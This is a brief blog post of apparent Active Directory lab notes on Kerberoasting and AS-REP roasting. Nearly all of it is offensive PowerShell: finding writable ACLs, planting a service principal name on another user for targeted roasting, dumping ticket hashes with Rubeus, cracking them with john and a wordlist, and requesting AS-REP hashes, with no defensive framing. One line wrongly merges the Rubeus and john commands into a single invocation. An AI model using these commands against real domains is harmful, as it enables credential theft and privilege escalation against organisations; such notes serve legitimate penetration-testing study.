---
layout: post
date: 30/10/2022
author: Aswin Gopalakrishnan
title: Kerberoasting
---


- Find "Write" Permissions
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```
  
- Find SPN
```powershell
Get-DomainUser -Identity support1user | select serviceprincipalname
Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName
```

- Set-SPN
```powershell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}
    ```

- Kerberoasting
```powershell
Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

## AS-REP Roasting
Find accounts without Kerberos preauthentication and request an AS-REP hash for offline cracking:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
Invoke-ASREPRoast -Verbose
```
